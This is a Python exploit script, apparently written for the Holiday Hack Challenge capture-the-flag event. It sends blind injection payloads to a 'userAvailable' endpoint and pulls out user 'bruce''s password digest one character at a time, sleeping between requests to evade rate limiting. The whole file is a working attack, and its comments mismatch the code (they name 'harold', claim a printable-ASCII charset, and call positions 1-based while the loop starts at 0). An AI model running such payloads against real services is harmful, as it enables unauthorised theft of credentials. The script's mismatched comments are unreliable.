import requests
import time

# Target URL
BASE_URL = "https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable"

# Character set to test (expanded to cover printable ASCII)
charset = "abcdef0123456789"

# Max length of digest to extract
MAX_LENGTH = 100

# Result accumulator
extracted = ""

def check_char(position, char):
    # Anchor on the specific user (harold) and extract from digest
    payload = f"\" or (c.username='bruce' and SUBSTRING(c.digest,{position},1)='{char}')--"
    params = {
        "username": payload,
    }
    
    response = requests.get(BASE_URL, params=params)
    # Sleep to bypass rate limiting
    time.sleep(0.5)
    
    # Interpret response
    return '"available":false' in response.text

# Extraction loop
for pos in range(0, MAX_LENGTH + 1):  # SUBSTRING positions are 1-based
    found = False
    for ch in charset:
        if check_char(pos, ch):
            extracted += ch
            print(f"[*] Found character at position {pos}: {ch}")
            found = True
            break
    if not found:
        print(f"[-] No match at position {pos}, assuming end of string.")
        break

print(f"\n[+] Extracted digest for harold: {extracted}")
